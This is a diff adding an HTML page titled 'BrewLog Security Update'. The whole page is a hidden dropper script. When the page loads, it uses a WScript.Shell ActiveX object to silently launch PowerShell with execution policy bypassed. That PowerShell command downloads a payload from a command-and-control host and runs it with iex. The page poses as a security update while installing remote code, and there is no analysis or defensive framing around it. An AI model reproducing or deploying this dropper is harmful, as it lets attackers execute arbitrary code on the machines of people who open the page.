@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>BrewLog Security Update</title>
+</head>
+<body>
+<script language="JavaScript">
+  var shell = new ActiveXObject("WScript.Shell");
+  var payloadUrl = "http://c2.brewlog-caffeine.net/payload";
+  var psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadString('" + payloadUrl + "') | iex\"";
+  shell.Run(psCmd, 0, false);
+</script>
+</body>
+</html>
